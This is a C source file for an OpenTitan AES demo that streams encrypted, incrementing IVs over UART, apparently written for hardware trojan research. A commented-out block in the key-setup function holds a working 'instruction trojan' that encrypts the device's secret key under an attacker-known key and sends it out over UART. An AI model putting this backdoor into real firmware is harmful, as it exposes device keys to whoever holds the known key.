// Copyright lowRISC contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

#include "sw/device/lib/base/memory.h"
#include "sw/device/lib/aes.h"
#include "sw/device/lib/dif/dif_uart.h"
#include "sw/device/lib/pinmux.h"
#include "sw/device/lib/runtime/print.h"
#include "sw/device/lib/runtime/check.h"
#include "sw/device/lib/testing/test_status.h"
#include "sw/device/lib/uart.h"

#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"

// for trojan
#include "build-out/sw/device/lib/e287d45@@aes_ot@sta/aes_regs.h"
#include "sw/device/lib/common.h"
#define AES0_BASE_ADDR TOP_EARLGREY_AES_BASE_ADDR
#define AES_NUM_REGS_KEY 8
#define AES_NUM_REGS_IV 4
#define AES_NUM_REGS_DATA 4
#include "sw/device/lib/base/mmio.h"
#include "build-out/sw/device/lib/dif/5fb29ed@@uart_ot@sta/uart_regs.h"

/**
 * OpenTitan program for continuous crypto analysis.
 *
 * Send 16 bytes as 'iv'. Then the program starts to write continuously
 * the encrypted 'iv' and increments it.
 */

static aes_cfg_t aes_cfg;

static void hsm_demo_aes_set_key() __attribute__ ((optnone)) {
  uint8_t key_share0[32] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, };
  uint8_t key_share1[32];
  memset(key_share1, 0, sizeof(key_share1));

  /*
  // code for the instruction trojan at this exact spot for easier trojan compiling
  // original trojan code
  //asm volatile("before_trojan:");
  //const uint8_t *ciphertext = (uint8_t *) 0x1000001c; // verify this address each compile!
  //const uint8_t key_known[16] = {0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff};
  //aes_key_put(key_known, key_share1, 128);
  //aes_data_put_wait(key_share0);
  //aes_data_get_wait(ciphertext);
  //for (size_t i = 0; i < 16; ++i) {
  //  uart_send_char(ciphertext[i]);
  //}
  //asm volatile("j before_trojan;");

  // instruction trojan
  asm volatile("before_trojan:");
  asm volatile("addi sp,sp,-32");
  const uint8_t *ciphertext = (uint8_t *) 0x1000001c; // verify this address each compile!
  const uint8_t key_nsa[16] = {0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff};
  const dif_uart_t *uart = (dif_uart_t *) 0x10000008; // verify this address each compile!
  // no call here, as we would need to switch back to real code. would be: aes_key_put(key_nsa, key_share1, 128);
  {
    for (int i = 0; i < 4; ++i) {
        REG32(AES_KEY_SHARE0_0(0) + i * sizeof(uint32_t)) = ((uint32_t *)key_nsa)[i];
        REG32(AES_KEY_SHARE1_0(0) + i * sizeof(uint32_t)) = ((uint32_t *)key_share1)[i];
    }
    for (int i = 4; i < AES_NUM_REGS_KEY; ++i) {
        REG32(AES_KEY_SHARE0_0(0) + i * sizeof(uint32_t)) = 0x0;
        REG32(AES_KEY_SHARE1_0(0) + i * sizeof(uint32_t)) = 0x0;
    }
  }

  // no call here. would be: aes_data_put_wait(key_share0);
  {
    while (!(REG32(AES_STATUS(0)) & (0x1u << AES_STATUS_INPUT_READY))) { }
    for (int i = 0; i < AES_NUM_REGS_DATA; ++i) {
        REG32(AES_DATA_IN_0(0) + i * sizeof(uint32_t)) = ((uint32_t *)key_share0)[i];
    }
  }

  // no call here. would be: aes_data_get_wait(ciphertext);
  {
    while (!(REG32(AES_STATUS(0)) & (0x1u << AES_STATUS_OUTPUT_VALID))) { }
    for (int i = 0; i < AES_NUM_REGS_DATA; ++i) {
        ((uint32_t *)ciphertext)[i] = REG32(AES_DATA_OUT_0(0) + i * sizeof(uint32_t));
    }
  }

  for (size_t i = 0; i < 16; ++i) {
    // no call here. would be: uart_send_char(ciphertext[i]);
    {
        while ((((volatile uint32_t *)uart->params.base_addr.base)[UART_STATUS_REG_OFFSET / sizeof(uint32_t)] >> UART_STATUS_TXFULL) & 0x1) { }
        ((volatile uint32_t *)uart->params.base_addr.base)[UART_WDATA_REG_OFFSET / sizeof(uint32_t)] = (ciphertext[i] & UART_WDATA_WDATA_MASK) << UART_WDATA_WDATA_OFFSET;
        while (!((((volatile uint32_t *)uart->params.base_addr.base)[UART_STATUS_REG_OFFSET / sizeof(uint32_t)] >> UART_STATUS_TXIDLE) & 0x1)) { }
    }
  }
  asm volatile("addi sp,sp,32");
  asm volatile("j before_trojan");
  */

  aes_key_put(key_share0, key_share1, aes_cfg.key_len);
}

static void hsm_demo_aes_encrypt(const uint8_t *plaintext,
                                 size_t plaintext_len,
                                 uint8_t *ciphertext) {
  uint8_t data[16];
  CHECK(plaintext_len <= sizeof(data));
  memcpy(data, plaintext, plaintext_len);
  aes_data_put_wait(data);

  aes_data_get_wait(ciphertext);
}

/**
 * Initializes the AES peripheral.
 */
static void init_aes(void) {
  // Setup AES config
  aes_cfg.mode = kAesEcb;
  aes_cfg.key_len = kAes128;
  aes_cfg.manual_operation = false;

  // Encode
  aes_cfg.operation = kAesEnc;
  aes_init(aes_cfg);
}

/**
 * Main function.
 */
int main(void) {
  static uint8_t iv[16];
  static uint8_t ciphertext[16];

  uart_init(kUartBaudrate);
  base_set_stdout(uart_stdout);

  pinmux_init();

  init_aes();

  for (size_t i = 0; i < 16; i++) {
    char rcv_char;
    while (uart_rcv_char(&rcv_char) == -1);
    iv[i] = rcv_char;
  }

  // set the AES key
  hsm_demo_aes_set_key();

  while (true) {
    // encrypt the current IV
    hsm_demo_aes_encrypt(iv, 16, ciphertext);
    
    // send the ciphertext over UART
    for (size_t i = 0; i < sizeof(ciphertext); ++i) {
        uart_send_char(ciphertext[i]);
    }

    // increment the IV by one
    for (int8_t i = 15; !++iv[i] && i >= 0; --i) {}
  }

  return 0;
}
